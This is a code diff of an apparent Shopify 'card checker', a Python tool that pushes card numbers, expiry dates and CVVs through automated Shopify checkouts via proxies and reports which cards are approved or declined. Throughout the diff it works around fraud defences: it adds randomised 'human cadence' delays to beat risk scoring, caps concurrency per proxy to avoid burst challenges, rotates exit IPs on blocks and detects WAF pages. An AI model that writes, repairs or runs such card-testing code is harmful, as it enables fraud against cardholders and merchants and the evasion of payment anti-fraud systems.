-def _extract_amounts_from_seller(sp):
-    """Extract only: totals (for reporting) + payment identifiers.
-    Tax / merch / shipping are intentionally NOT extracted — the submit
-    payload uses {any: True} for those so Shopify computes them from
-    the payment amount, eliminating TAX_TAX_INCLUSIVITY_MISMATCH on
-    VAT-inclusive (UK/EU) stores."""
-    out = {
-        "checkout_total": None, "total": None, "running": None,
-        "payment_identifier": None, "payment_stable_id": None,
-        "payment_due_at": None, "payment_special": None,
-        "gateway": None,
-    }
-    try:
-        v = (sp.get("checkoutTotal") or {}).get("value", {}).get("amount")
-        if v is not None: out["checkout_total"] = str(v)
-        v = (sp.get("total") or {}).get("value", {}).get("amount")
-        if v is not None: out["total"] = str(v)
-        v = (sp.get("runningTotal") or {}).get("value", {}).get("amount")
-        if v is not None: out["running"] = str(v)
-    except Exception: pass
-    try:
-        pay = sp.get("payment") or {}
-        if pay.get("__typename") == "FilledPaymentTerms":
-            best = None
-            for m in pay.get("availablePaymentLines", []):
-                pm = m.get("paymentMethod", {})
-                ident = pm.get("paymentMethodIdentifier")
-                if not ident: continue
-                if pm.get("checkoutHostedFields"):
-                    best = pm; break
-                if best is None: best = pm
-            if best:
-                out["payment_identifier"] = best["paymentMethodIdentifier"]
-                out["gateway"] = (best.get("extensibilityDisplayName") or best.get("name"))
-        pl = pay.get("paymentLines") or []
-        if pl and isinstance(pl[0], dict):
-            out["payment_stable_id"] = pl[0].get("stableId")
-            _due = pl[0].get("dueAt")
-            out["payment_due_at"] = None if (_due and 'T' in str(_due)) else _due
-            out["payment_special"] = pl[0].get("specialInstructions")
-    except Exception: pass
-    return out
-
-
-# ═══════════════════════════════════════════════════════════════════════
-# Main flow
-# ═══════════════════════════════════════════════════════════════════════
-def _poll_after_seconds(val, default=2.0):
-    # pollAfter may be seconds OR an ISO timestamp ("2026-11-17T13:39:35Z")
-    try:
-        if isinstance(val, (int, float)):
-            return max(float(val), 1.5)
-        sv = str(val).strip()
-        if "T" in sv and ":" in sv:
-            from datetime import datetime, timezone
-            dt = datetime.fromisoformat(sv.replace("Z", "+00:00"))
-            return max((dt - datetime.now(timezone.utc)).total_seconds(), 1.5)
-        return max(float(sv), 1.5)
-    except Exception:
-        return default
-
-
-# ── per-proxy concurrency gate ────────────────────────────────────────
-# Shopify's risk engine challenges bursts from a single exit IP. Rukia-style
-# checkers keep ≤2 concurrent checkouts per IP; this gate does the same.
-_PROXY_SEMAPHORES = {}
-_PROXY_GLock = threading.Lock()
-PROXY_MAX_CONCURRENT = 2
-
-def _proxy_gate(proxy):
-    # THREADING semaphore (not asyncio): each request runs its own event loop,
-    # so an asyncio.Semaphore would be bound to the first request's loop and
-    # blow up with "attached to a different loop" under concurrency.
-    key = (proxy or "direct").split("@")[-1] or "direct"
-    with _PROXY_GLock:
-        sem = _PROXY_SEMAPHORES.get(key)
-        if sem is None:
-            sem = threading.BoundedSemaphore(PROXY_MAX_CONCURRENT)
-            _PROXY_SEMAPHORES[key] = sem
-    return sem
-
-
 async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=None):
     gateway = "UNKNOWN"
     currency = "USD"
@@ -1625,17 +1519,13 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 warm_headers = build_headers(profile, ourl, for_document=True)
                 xhr_headers = build_headers(profile, ourl, for_document=False)
 
-            # warm-up is BEST-EFFORT (matches s4chiz/rukia flow): a slow proxy may
-            # time out here while cart/checkout still work — never abort the check
-            for _w in range(2):
-                try:
-                    await session.get(ourl, headers=warm_headers, proxy=proxy,
-                                      timeout=12, allow_redirects=True)
-                    print(f"[warmup] ✅ {time.time()-t0:.2f}s root primed")
-                    break
-                except Exception as e:
-                    print(f"[warmup] ⚠️ {_w+1}/2 {str(e)[:80]}")
-                    await asyncio.sleep(1.0)
+            try:
+                await session.get(ourl, headers=warm_headers, proxy=proxy,
+                                  timeout=8, allow_redirects=True)
+                print(f"[warmup] ✅ {time.time()-t0:.2f}s root primed")
+            except Exception as e:
+                print(f"[warmup] ⚠️ {str(e)[:80]}")
+                return False, "Change Proxy", gateway, variant_price_fallback, currency
 
             # 🔥 FIX: Abort if this isn't a Shopify site
             is_shopify = await verify_shopify_store(session, ourl, proxy, profile)
@@ -1657,8 +1547,6 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                     return_exceptions=True)
                 if isinstance(res[0], str) and res[0]: currency = res[0]
                 candidate = res[1] if not isinstance(res[1], Exception) else None
-                if candidate == "PROXY_DEAD":
-                    return False, "Change Proxy", gateway, "0.00", currency
                 print(f"[detect] ✅ {time.time()-t0:.2f}s currency={currency} candidate={'yes' if candidate else 'no'}")
 
             if not candidate and not variant_id:
@@ -1676,8 +1564,6 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 variant_price_fallback = candidate["price"]
                 print(f"[candidate] cheapest variant={numeric_vid} price={candidate['price']}")
 
-            loc_country = "US"  # no market pin — s4chiz/rukia flow has no extra request here
-
             add_referer = f"{ourl}/products/{product_handle}" if product_handle else f"{ourl}/"
             ok, payload = await storefront_cart_add(
                 session, ourl, numeric_vid, 1, add_referer, proxy, profile)
@@ -1690,30 +1576,13 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
             print(f"[cart] ✅ {time.time()-t0:.2f}s variant={variant_id} "
                   f"price={variant_price_fallback} ship_req={cart_requires_shipping}")
 
-            # 🔥 CORE FLOW FIX (s4chiz/rukia-identical): NO cart view, NO /cart POST
-            # chain — checkout is created with ONE POST /checkout/ (redirects
-            # followed). Every extra storefront request between add.js and checkout
-            # is a fingerprintable divergence from the real browser flow.
-            co_h = build_headers(profile, ourl, for_document=True,
-                                 sec_fetch_site="same-origin", with_user=False)
-            co_h["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
-            co_h["sec-fetch-dest"] = "document"
-            co_h["sec-fetch-mode"] = "navigate"
-            co_h["sec-fetch-user"] = "?1"
-            co_h["referer"] = add_referer or f"{ourl}/"
-            response = None
-            try:
-                response = await session.post(f"{ourl}/checkout/", allow_redirects=True,
-                                              headers=co_h, proxy=proxy, timeout=25)
-            except Exception as e:
-                print(f"[checkout] ⚠️ POST /checkout/ {str(e)[:70]}")
-            checkout_url = str(response.url) if response is not None else ""
-            text = response.text if response is not None else ""
-            if response is None or is_waf_block(text or "") or response.status_code in (403, 503):
-                return False, "Change Proxy", gateway, variant_price_fallback, currency
-            if "customer_authentication" in checkout_url or "login" in checkout_url.lower():
-                return False, "Site requires login!", gateway, variant_price_fallback, currency
-            if "/checkouts/" not in checkout_url:
+            cart_html = await view_cart_page(session, ourl, add_referer, proxy, profile)
+
+            checkout_url, text, response = await resolve_checkout_after_cart(
+                session, ourl, cart_html, proxy, profile)
+            if not checkout_url or not response:
+                if is_waf_block(text or ""):
+                    return False, "Change Proxy", gateway, variant_price_fallback, currency
                 return False, "Failed to get checkout URL", gateway, variant_price_fallback, currency
             
             checkout_origin = urlparse(checkout_url).netloc
@@ -1731,9 +1600,6 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
             page_id = _gen_page_id()
             gql_referer = _payment_referer(checkout_url, source_id)
             print(f"[checkout] referer={gql_referer[:120]}")
-            # 🔥 HUMAN CADENCE: a real buyer reads the checkout page before the
-            # session's first API call — this timing is a scored risk signal
-            await asyncio.sleep(random.uniform(1.5, 3.5))
 
             sst = (response.headers.get("X-Checkout-One-Session-Token")
                    or response.headers.get("x-checkout-one-session-token"))
@@ -1967,7 +1833,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                     "destinationChanged": True
                 }],
                 "noDeliveryRequired": [], 
-                "useProgressiveRates": False,
+                "useProgressiveRates": True,
                 "prefetchShippingRatesStrategy": None, 
                 "supportsSplitShipping": True,
             }
@@ -1989,25 +1855,30 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                         "variantId": f"gid://shopify/ProductVariant/{variant_id}",
                         "properties": [], "sellingPlanId": None, "sellingPlanDigest": None}},
                     "quantity": {"items": {"value": 1}},
-                    "expectedTotalPrice": {"value": {"amount": variant_price_fallback or "0.01",
-                                                     "currencyCode": currency}},
+                    "expectedTotalPrice": {"any": True},
                     "lineComponentsSource": None, "lineComponents": []}]},
                 "payment": {
                     "totalAmount": {"any": True}, "paymentLines": [],
-                    "billingAddress": {"streetAddress": {
-                        "address1": "", "city": "", "countryCode": country_code,
-                        "lastName": "", "zoneCode": "ENG", "phone": ""}},
+                    "billingAddress": {"streetAddress": dict(billing_street)},
+                    "creditCardBin": _cc_bin(cc),
+                    "allowStoreCredit": False,
                 },
                 "buyerIdentity": {
                     "customer": {"presentmentCurrency": currency, "countryCode": country_code},
                     "email": email, "emailChanged": False,
                     "phoneCountryCode": country_code,
-                    "marketingConsent": [{"email": {"value": email}}],
+                    "phone": phone,
+                    "marketingConsent": [{"email": {"consentState": "DECLINED", "value": email}}],
+                    "messagingMarketingConsent": {
+                        "consentState": "DECLINED",
+                        "countryCode": country_code,
+                        "disclosureCountryCode": country_code,
+                    },
                     "shopPayOptInPhone": {"countryCode": country_code},
                     "rememberMe": False},
                 "tip": {"tipLines": []},
                 "taxes": {"proposedAllocations": None,
-                          "proposedTotalAmount": {"value": {"amount": "0", "currencyCode": currency}},
+                          "proposedTotalAmount": {"any": True},
                           "proposedTotalIncludedAmount": None,
                           "proposedMixedStateTotalAmount": None,
                           "proposedExemptions": []},
@@ -2027,7 +1898,6 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
             proposal_payload = {"variables": proposal_variables,
                                 "operationName": "Proposal"}
 
-            await asyncio.sleep(random.uniform(0.8, 2.0))  # human: page interaction
             response, resp_text = await gql(
                 session, "Proposal", headers, proposal_payload, proxy,
                 checkout_html=text, checkout_origin=checkout_origin,
@@ -2126,7 +1996,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 print(f"[P1] ⚠️ UnavailableTerms — FULL RESPONSE:")
                 print(json.dumps(resp_json, indent=2)[:2000])
 
-            if dtype in ("PendingTerms", "UnavailableTerms"):
+            if dtype == "PendingTerms":
                 await asyncio.sleep(1.5)
                 response, resp_text = await gql(
                     session, "Proposal", headers, proposal_payload, proxy,
@@ -2175,7 +2045,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 delivery_line = {
                     "destination": {"streetAddress": dict(billing_street)},
                     "targetMerchandiseLines": _delivery_target(negotiated_stable_id),
-                    "deliveryMethodTypes": ["SHIPPING", "LOCAL"],
+                    "deliveryMethodTypes": ["SHIPPING"],
                     "expectedTotalPrice": {"any": True},
                     "destinationChanged": True
                 }
@@ -2247,50 +2117,18 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 proposal_variables["checkpointData"] = checkpoint_data
 
             amt = _extract_amounts_from_seller(_s2)
-            # fallback: buyer's runningTotal often resolves before the seller proposal
-            if not _positive_amount(amt["checkout_total"]) and not _positive_amount(amt["total"]):
-                _brt = ((_r2.get("buyerProposal") or {}).get("runningTotal") or {}).get("value") or {}
-                try:
-                    if float(_brt.get("amount") or 0) > 0:
-                        amt["total"] = str(_brt["amount"])
-                        if _brt.get("currencyCode"): currency = str(_brt["currencyCode"])
-                        print(f"[amount] P2 buyerRunningTotal fallback: {amt['total']}")
-                except (ValueError, TypeError):
-                    pass
             checkout_total = amt["checkout_total"]; total_amount = amt["total"]
             payment_identifier = amt["payment_identifier"] or None
             if amt["gateway"]: gateway = amt["gateway"]
             payment_stable_id = amt["payment_stable_id"]
-            payment_terms_template_id = None
-            try:
-                _pf = ((_s2.get("payment") or {}).get("paymentFlexibilityPaymentTermsTemplate") or {})
-                if _pf.get("id"): payment_terms_template_id = _pf["id"]
-            except Exception:
-                pass
             payment_due_at = amt["payment_due_at"]
             payment_special = amt["payment_special"]
-
-            # capture the session's ACTUAL presentment currency — the buyer identity
-            # must match this or the submit gets CURRENCY_DOES_NOT_MATCH
-            # try multiple sources: buyer runningTotal → seller checkoutTotal → response text
-            _cc2 = ((_r2.get("buyerProposal") or {}).get("runningTotal") or {}).get("value", {}).get("currencyCode")
-            if not _cc2:
-                _cc2 = ((_s2.get("checkoutTotal") or {}).get("value") or {}).get("currencyCode")
-            if not _cc2:
-                _ccm = re.search(r'"currencyCode"\s*:\s*"([A-Z]{3})"', resp_text)
-                if _ccm:
-                    _cc2 = _ccm.group(1)
-            if _cc2:
-                currency = str(_cc2)
 
             print(f"[amount] P2: checkout={checkout_total!r} total={total_amount!r}")
 
             _needs_total_poll = (_positive_amount(checkout_total) is None
                                  and _positive_amount(total_amount) is None)
             if _needs_total_poll:
-                print(f"[amount] P2 sellerProposal keys: {list((_s2 or {}).keys())[:10]}")
-                print(f"[amount] P2 seller.delivery: {(_s2.get('delivery') or {}).get('__typename')!r}")
-                print(f"[amount] P2 raw[:600]: {resp_text[:600]}")
                 for _tp in range(P2_TOTAL_POLL_MAX):
                     await asyncio.sleep(min(1.0 + 0.2 * _tp, 2.5))
                     response, resp_text = await gql(
@@ -2337,7 +2175,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
             except (ValueError, TypeError): pass
 
             if not payment_identifier:
-                return False, "No valid payment method", gateway, variant_price_fallback, currency
+                return False, "No valid payment method", gateway, final_total, currency
 
             print(f"[amount] final: total={final_total} {currency}")
 
@@ -2360,7 +2198,8 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 "content-type": "application/json",
                 "origin": "https://checkout.pci.shopifyinc.com",
                 "referer": vault_referer,
-                    "sec-ch-ua": profile["sec_ch_ua"],
+                "user-agent": ua,
+                "sec-ch-ua": profile["sec_ch_ua"],
                 "sec-ch-ua-mobile": profile["mobile"],
                 "sec-ch-ua-platform": profile["platform"],
                 "sec-fetch-dest": "empty",
@@ -2370,22 +2209,18 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
             if ident_sig:
                 vh["shopify-identification-signature"] = ident_sig
 
-            # 🔥 HUMAN CADENCE: typing 16 digits + expiry + cvv takes seconds
-            await asyncio.sleep(random.uniform(2.5, 6.0))
             token = None; last_err = None
-            for _attempt in range(6):
+            for _attempt in range(2):
                 try:
-                    await asyncio.sleep(random.uniform(0.6, 1.6))  # human: click pay
                     r_v = await session.post(
                         "https://checkout.pci.shopifyinc.com/sessions",
                         json=vault_payload, headers=vh, proxy=proxy,
                         timeout=VAULT_TIMEOUT)
-                    if r_v.status_code in (403, 429, 503):
-                        # rotating egress: next attempt exits a new IP
-                        await asyncio.sleep(_throttle_wait(r_v, 3.0 + 1.5 * _attempt)); continue
+                    if r_v.status_code == 429:
+                        await asyncio.sleep(_throttle_wait(r_v, 3.0)); continue
                     if r_v.status_code not in (200, 201):
                         last_err = f"PCI HTTP {r_v.status_code}"
-                        await asyncio.sleep(1.2 + 0.8 * _attempt); continue
+                        await asyncio.sleep(0.8); continue
                     try: token = r_v.json().get("id")
                     except Exception:
                         last_err = "PCI bad JSON"; await asyncio.sleep(1.0); continue
@@ -2395,8 +2230,8 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                     last_err = f"PCI error: {e}"; await asyncio.sleep(1.0)
             if not token:
                 if last_err and _looks_like_connection_error(last_err):
-                    return False, "Change Proxy", gateway, variant_price_fallback, currency
-                return False, last_err or "PCI failed", gateway, variant_price_fallback, currency
+                    return False, "Change Proxy", gateway, final_total, currency
+                return False, last_err or "PCI failed", gateway, final_total, currency
             print(f"[vault] ✅ {time.time()-t0:.2f}s token={token[:30]}...")
 
             # ── P3 ────────────────────────────────────────────────────────
@@ -2417,19 +2252,18 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 "allowStoreCredit": False,
             }
 
-            await asyncio.sleep(random.uniform(1.0, 2.5))  # human: fill card details
             response, resp_text3 = await gql(
                 session, "Proposal", headers, proposal_payload, proxy,
                 checkout_html=text, checkout_origin=checkout_origin,
                 build_id=build_id, profile=profile)
 
             if resp_text3 == "Change Proxy":
-                return False, "Change Proxy", gateway, variant_price_fallback, currency
+                return False, "Change Proxy", gateway, final_total, currency
             _log_aux_signals("P3", resp_text3)
             if is_waf_block(resp_text3):
-                return False, "Change Proxy (WAF on P3)", gateway, variant_price_fallback, currency
+                return False, "Change Proxy (WAF on P3)", gateway, final_total, currency
             if is_captcha_required(resp_text3):
-                return False, "CARD_DECLINED", gateway, variant_price_fallback, currency
+                return False, "CARD_DECLINED", gateway, final_total, currency
 
             try:
                 _p3_json = json.loads(resp_text3)
@@ -2445,16 +2279,8 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 _p3_seller = _p3_result.get("sellerProposal") or {}
                 _cap3 = extract_captcha_challenge(_p3_seller)
                 if _cap3 and _cap3[0] not in (None, "PENDING"):
-                    return False, "CARD_DECLINED", gateway, variant_price_fallback, currency
+                    return False, "CARD_DECLINED", gateway, final_total, currency
                 amt3 = _extract_amounts_from_seller(_p3_seller)
-                try:
-                    _pf3 = ((_p3_seller.get("payment") or {})
-                            .get("paymentFlexibilityPaymentTermsTemplate") or {})
-                    if _pf3.get("id"):
-                        payment_terms_template_id = _pf3["id"]
-                        print(f"[flex] P3 terms template: {payment_terms_template_id}")
-                except Exception:
-                    pass
                 if amt3["payment_identifier"]: payment_identifier = amt3["payment_identifier"]
                 if amt3["gateway"]: gateway = amt3["gateway"]
                 if amt3["payment_stable_id"]: payment_stable_id = amt3["payment_stable_id"]
@@ -2503,8 +2329,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                         "variantId": f"gid://shopify/ProductVariant/{variant_id}",
                         "properties": [], "sellingPlanId": None, "sellingPlanDigest": None}},
                     "quantity": {"items": {"value": 1}},
-                    "expectedTotalPrice": {"value": {"amount": variant_price_fallback or "0.01",
-                                                     "currencyCode": currency}},
+                    "expectedTotalPrice": {"any": True},
                     "lineComponentsSource": None, "lineComponents": []}]},
                 "memberships": {"memberships": []},
                 "payment": payment_block,
@@ -2522,7 +2347,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                     "rememberMe": False},
                 "tip": {"tipLines": []},
                 "taxes": {"proposedAllocations": None,
-                          "proposedTotalAmount": {"value": {"amount": "0", "currencyCode": currency}},
+                          "proposedTotalAmount": {"any": True},
                           "proposedTotalIncludedAmount": None,
                           "proposedMixedStateTotalAmount": None,
                           "proposedExemptions": []},
@@ -2561,15 +2386,15 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                                               headers=headers, json=submit_payload, proxy=proxy, timeout=45)
                 submit_text = response.text
             except Exception as e:
-                return False, f"Change Proxy", gateway, variant_price_fallback, currency
+                return False, f"Change Proxy", gateway, final_total, currency
 
             if submit_text == "Change Proxy":
-                return False, "Change Proxy", gateway, variant_price_fallback, currency
+                return False, "Change Proxy", gateway, final_total, currency
             _log_aux_signals("submit", submit_text)
             if is_waf_block(submit_text):
-                return False, "Change Proxy (WAF on submit)", gateway, variant_price_fallback, currency
+                return False, "Change Proxy (WAF on submit)", gateway, final_total, currency
             if is_captcha_required(submit_text):
-                return False, "CARD_DECLINED", gateway, variant_price_fallback, currency
+                return False, "CARD_DECLINED", gateway, final_total, currency
 
             if ("TAX_NEW_TAX_MUST_BE_ACCEPTED" in submit_text
                     or "Your order total has changed" in submit_text
@@ -2581,12 +2406,12 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                     checkout_html=text, checkout_origin=checkout_origin,
                     build_id=build_id, profile=profile)
                 if resp_text == "Change Proxy":
-                    return False, "Change Proxy", gateway, variant_price_fallback, currency
+                    return False, "Change Proxy", gateway, final_total, currency
                 _log_aux_signals("tax-retry-proposal", resp_text)
                 if is_waf_block(resp_text):
-                    return False, "Change Proxy (WAF on tax-retry)", gateway, variant_price_fallback, currency
+                    return False, "Change Proxy (WAF on tax-retry)", gateway, final_total, currency
                 if is_captcha_required(resp_text):
-                    return False, "CARD_DECLINED", gateway, variant_price_fallback, currency
+                    return False, "CARD_DECLINED", gateway, final_total, currency
                 try:
                     _rj = json.loads(resp_text)
                     _r_rt = (_rj.get("data", {}).get("session", {})
@@ -2616,34 +2441,33 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                         submit_input["checkpointData"] = checkpoint_data
                     if queueToken:
                         submit_input["queueToken"] = queueToken
-                    await asyncio.sleep(random.uniform(1.0, 2.5))  # human: review order
                     response, submit_text = await gql(
                         session, "SubmitForCompletion", headers, submit_payload, proxy,
                         checkout_html=text, checkout_origin=checkout_origin,
                         build_id=build_id, profile=profile)
                     if submit_text == "Change Proxy":
-                        return False, "Change Proxy", gateway, variant_price_fallback, currency
+                        return False, "Change Proxy", gateway, final_total, currency
                     _log_aux_signals("submit-tax-retry", submit_text)
                     if is_captcha_required(submit_text):
-                        return False, "CARD_DECLINED", gateway, variant_price_fallback, currency
+                        return False, "CARD_DECLINED", gateway, final_total, currency
                 except Exception as e:
                     print(f"[submit] tax-retry error: {str(e)[:120]}")
                     real_err = extract_real_error_from_text(submit_text)
-                    return False, real_err or "TAX_CHANGED", gateway, variant_price_fallback, currency
+                    return False, real_err or "TAX_CHANGED", gateway, final_total, currency
 
             if "The requested payment method is not available." in submit_text:
-                return False, "Payment method not available", gateway, variant_price_fallback, currency
+                return False, "Payment method not available", gateway, final_total, currency
 
             try:
                 sjr = json.loads(submit_text)
             except json.JSONDecodeError:
                 if _looks_like_connection_error(submit_text):
-                    return False, "Change Proxy", gateway, variant_price_fallback, currency
+                    return False, "Change Proxy", gateway, final_total, currency
                 real_err = extract_real_error_from_text(submit_text)
-                return False, real_err or "Bad submit response", gateway, variant_price_fallback, currency
+                return False, real_err or "Bad submit response", gateway, final_total, currency
             if "errors" in sjr:
                 real_err = extract_real_error_from_text(submit_text)
-                return False, real_err or "Submit GraphQL error", gateway, variant_price_fallback, currency
+                return False, real_err or "Submit GraphQL error", gateway, final_total, currency
 
             submit_data = sjr.get("data", {}).get("submitForCompletion", {}) or {}
             result_type = submit_data.get("__typename", "")
@@ -2672,24 +2496,24 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                               or e.get("nonLocalizedMessage") or e.get("message", ""))
                     if isinstance(detail, dict): detail = json.dumps(detail)
                     return False, (f"{code}: {detail}" if detail else code), \
-                           gateway, variant_price_fallback, currency
-                return False, "SUBMIT_REJECTED", gateway, variant_price_fallback, currency
+                           gateway, final_total, currency
+                return False, "SUBMIT_REJECTED", gateway, final_total, currency
             elif result_type == "SubmitFailed":
                 return False, str(submit_data.get("reason", "SUBMIT_FAILED")), \
-                       gateway, variant_price_fallback, currency
+                       gateway, final_total, currency
             elif result_type == "TooManyRequests":
-                return False, "TOO_MANY_REQUESTS", gateway, variant_price_fallback, currency
+                return False, "TOO_MANY_REQUESTS", gateway, final_total, currency
             elif result_type == "Throttled":
                 wait = _poll_after_seconds(submit_data.get("pollAfter"))
                 await asyncio.sleep(max(wait, 1.5))
-                return False, "Throttled", gateway, variant_price_fallback, currency
+                return False, "Throttled", gateway, final_total, currency
             elif result_type == "CheckpointDenied":
-                return False, "CheckpointDenied", gateway, variant_price_fallback, currency
+                return False, "CheckpointDenied", gateway, final_total, currency
 
             if not rid:
                 real_err = extract_real_error_from_text(submit_text)
                 return False, real_err or f"No receipt ({result_type})", \
-                       gateway, variant_price_fallback, currency
+                       gateway, final_total, currency
 
             # ── Poll ──────────────────────────────────────────────────────
             poll_payload = {
@@ -2760,7 +2584,12 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                         return False, "BELOW_MERCHANT_MINIMUM", gateway, total_price, currency
                     if raw_code == "PAYMENTS_INSUFFICIENT_FUNDS":
                         raw_code = "INSUFFICIENT_FUNDS"
-                    # CAPTCHA_REQUIRED is surfaced as-is (store risk challenge)
+                    if raw_code == "CAPTCHA_REQUIRED":
+                        # Payment processor returned a decline code of
+                        # CAPTCHA_REQUIRED — this is a payment decline, NOT a
+                        # bot-detection wall.  The card was submitted and
+                        # processed successfully but the payment was rejected.
+                        raw_code = "CARD_DECLINED"
                     return False, raw_code, gateway, total_price, currency
                 if tn == "ActionRequiredReceipt":
                     return False, "3DS_REQUIRED", gateway, total_price, currency
@@ -2847,15 +2676,6 @@ def shopify_checker():
         try:
             success, message, gateway, price, currency = loop.run_until_complete(
                 process_card(cc, mes, ano, cvv, site, variant_id, proxy_str))
-            # 🔥 FIX: AVS zip mismatch — retry once with a different random address
-            if (not success and extract_clean_response(message) == "INCORRECT_ZIP"):
-                print(f"[REQ] 🔁 INCORRECT_ZIP → retrying with a fresh address")
-                loop2 = asyncio.new_event_loop()
-                try:
-                    success, message, gateway, price, currency = loop2.run_until_complete(
-                        process_card(cc, mes, ano, cvv, site, variant_id, proxy_str))
-                finally:
-                    loop2.close()
         finally:
             loop.close()
 
@@ -2866,12 +2686,9 @@ def shopify_checker():
         try: pf = float(str(price).replace(",", ""))
         except (ValueError, TypeError): pf = 0.0
         print(f"[REQ] 🏁 {elapsed:.2f}s | {clean} | {pf} {currency} | status={success}")
-        # signal proxy death so the caller's rotation drops this exit
-        proxy_dead = (clean == "Change Proxy")
         return _pretty({
             "Gateway": gateway, "Price": pf, "Currency": currency,
             "Response": clean, "Status": success,
-            "Proxy": "dead" if proxy_dead else "live",
             "cc": cc_string, "Time": f"{elapsed:.2f}s",
         })
     except Exception as e:
